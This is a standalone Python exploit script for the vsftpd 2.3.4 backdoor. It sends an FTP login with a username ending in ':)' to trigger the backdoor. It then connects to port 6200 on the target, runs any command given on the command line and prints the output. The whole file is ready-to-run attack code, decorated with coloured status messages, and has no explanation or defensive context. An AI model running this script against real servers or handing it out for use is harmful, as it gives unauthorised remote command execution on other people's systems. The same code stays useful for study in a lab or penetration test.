import socket
import sys
import time
from colorama import Fore, Style, init

init(autoreset=True)

def expl01t(ip, port, command):
    try:
        print(Fore.CYAN + '======================' + Style.RESET_ALL)
        animation = "|/-\\"
        for i in range(5):
            time.sleep(0.1)
            sys.stdout.write("\r" + Fore.CYAN + '[*] Triggering backdoor' + animation[i % len(animation)] + Style.RESET_ALL)
            sys.stdout.flush()
        
        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_socket.connect((ip, port))

       
        ftp_socket.send(b'USER hello:)\n')
        ftp_socket.send(b'PASS password\n')
        time.sleep(2)
        ftp_socket.close()
        print(Fore.GREEN + '[*] Triggered backdoor' + Style.RESET_ALL)

    except Exception:
        print(Fore.RED + '[-] Failed to trigger backdoor on %s' % ip + Style.RESET_ALL)

    try:
        print(Fore.CYAN + '[*] Attempting to connect to backdoor...' + Style.RESET_ALL)
        backdoor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_socket.connect((ip, 6200))
        print(Fore.GREEN + '[*] Connected to backdoor on %s:6200' % ip + Style.RESET_ALL)
        command = str.encode(command + '\n')
        backdoor_socket.send(command)
        response = backdoor_socket.recv(1024).decode('utf-8')
        print(Fore.GREEN + '[*] Response:' + Style.RESET_ALL)
        print(response)
        backdoor_socket.close()

    except Exception:
        print(Fore.RED + '[-] Failed to connect to backdoor on %s:6200' % ip + Style.RESET_ALL)

if __name__ == '__main__':
    print(Fore.RED + ":)" + Style.RESET_ALL)  # ASCII Art
    if len(sys.argv) < 4:
        print(Fore.RED + 'usage --> python3 vsftpd_exploit.py <IP address> <port> <command>' + Style.RESET_ALL)

    else:
        expl01t(sys.argv[1], int(sys.argv[2]), sys.argv[3])
